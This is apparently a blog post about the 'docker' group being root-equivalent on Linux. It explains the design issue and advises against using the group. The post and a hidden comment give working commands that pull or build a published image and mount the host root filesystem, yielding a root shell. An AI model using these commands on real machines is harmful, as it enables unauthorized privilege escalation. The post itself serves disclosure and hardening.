---
layout: post
permalink: privilege-escalation-via-docker
title: Privilege Escalation via Docker
---

**TLDR;** Don't use the 'docker' group

[Docker](https://www.docker.com/), if you aren't already familiar with it, is a lightweight runtime and packaging tool. It's very similar to simply running a basic virtual machine, but with much less overhead. It's extremely nice for deploying applications as you can guarantee that they will run in identical environments, and the commit-like image system is handy as well.

If you happen to have gotten access to a user-account on a machine, and that user is a member of the 'docker' group, running the following command will give you a root shell:

<!-- Content Breaker -->

{% highlight console %}
> docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
{% endhighlight %}

<!-- Just in case Docker pulls the image:
**EDIT:** Docker appears to have removed by package from the Hub repository. The above command won't work, but you can achieve the same thing by building the Github repo:

{% highlight console %}
> git clone https://github.com/chrisfosterelli/dockerrootplease rootplease
> cd rootplease/
> docker build -t rootplease .
> docker run -v /:/hostOS -i -t rootplease
{% endhighlight %}
-->

This looks like the following when you run it:

{% highlight console %}
johndoe@testmachine:~$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
[...]
You should now have a root shell on the host OS
Press Ctrl-D to exit the docker instance / shell
# whoami
root
# 
{% endhighlight %}

## The Problem

When you've spent any amount of time with Docker, a common complaint is that all of the commands require `sudo` prefixing them. _This is for a good reason_. Many of the design decisions that Docker made inherently give significant power to any user who has access to the daemon.

Anyways, because the additional five characters was too much to type, a 'docker' group was introduced to the package. The Docker daemon will allow access to either the root user or any user in the 'docker' group. This means giving someone 'docker' group access is equivalent to giving them _permanent, non-password-protected root access_.

## The Solution

This is a hard fix for Docker. Because of many of the design decisions they've opted for, it would require significant code rewriting in order to allow non-root users to access the daemon without it being a security risk. My person advice is just simply not use the 'docker' group, ever. At the very least, this should be made more clear on the [documentation](http://docs.docker.com/installation/ubuntulinux/#create-a-docker-group) for the 'docker' group. A newbie might not understand what 'root-equivalent' really means.

In Docker's defense, they are aware that this is a security problem, although they apparently have no intention of actually fixing it. About half way down in their [security document](http://docs.docker.com/articles/security/#docker-daemon-attack-surface), they do explain that the 'docker' group is root-equivalent and why that is dangerous.

## Exploit Details

The command you run to perform the privilege escalation fetches my Docker image from the [Docker Hub Registry](https://registry.hub.docker.com/) and runs it. The `-v` parameter that you pass to Docker specifies that you want to create a [volume](http://docs.docker.com/userguide/dockervolumes/) in the Docker instance. The `-i` and `-t` parameters put Docker into 'shell mode' rather than starting a daemon process.

The instance is set up to mount the root filesystem of the host machine to the instance's volume, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.

There are _many, many_ other ways to achieve this, but this was one of the most straightforward. You can find the code in the [Github](https://github.com/chrisfosterelli/dockerrootplease) repo and the actual image on [Docker Hub](https://registry.hub.docker.com/u/chrisfosterelli/rootplease/).

Got any questions? [Tweet me.](https://twitter.com/chrisfosterelli)
